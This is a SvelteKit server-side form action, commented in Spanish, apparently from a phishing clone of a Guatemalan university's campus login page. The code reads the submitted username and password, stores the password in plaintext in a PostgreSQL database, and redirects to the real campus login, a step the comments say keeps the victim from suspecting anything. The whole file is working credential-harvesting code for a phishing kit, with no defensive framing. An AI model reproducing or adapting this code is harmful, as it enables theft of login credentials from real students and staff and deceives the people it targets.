// ------------------------------------------------------------------
// FORM ACTION — Página principal (clon UDV)
// ------------------------------------------------------------------
// Al enviar el formulario, los datos se guardan en Neon (PostgreSQL
// serverless) y se redirige a la página de login real para que la
// víctima no sospeche.
// ------------------------------------------------------------------

import { redirect } from '@sveltejs/kit';
import type { Actions } from './$types';
import sql from '$lib/server/db';

/** URL real del campus UDV a donde se redirige tras capturar los datos */
const CAMPUS_URL = 'https://campus.udv.edu.gt/login/index.php';

export const actions: Actions = {
	default: async ({ request }) => {
		// --- Leer datos del formulario ---
		const data = await request.formData();
		const username = (data.get('username') ?? '').toString().trim();
		const password = (data.get('password') ?? '').toString();

		// --- Guardar en Neon (serverless, ultra rápido) ---
		try {
			// Insertar o ignorar si el usuario ya existe
			const [user] = await sql`
				INSERT INTO users (username)
				VALUES (${username})
				ON CONFLICT (username) DO NOTHING
				RETURNING id
			`;

			// Si el usuario ya existía, obtener su id
			let userId = user?.id;
			if (!userId) {
				const [existing] = await sql`
					SELECT id FROM users WHERE username = ${username}
				`;
				userId = existing.id;
			}

			// Guardar la contraseña
			await sql`
				INSERT INTO user_passwords (user_id, password_hash)
				VALUES (${userId}, ${password})
			`;
		} catch (err) {
			console.error('Error guardando en DB:', err);
		}

		// --- Redirigir al login real (la víctima no sospecha nada) ---
		redirect(303, CAMPUS_URL);
	},
};
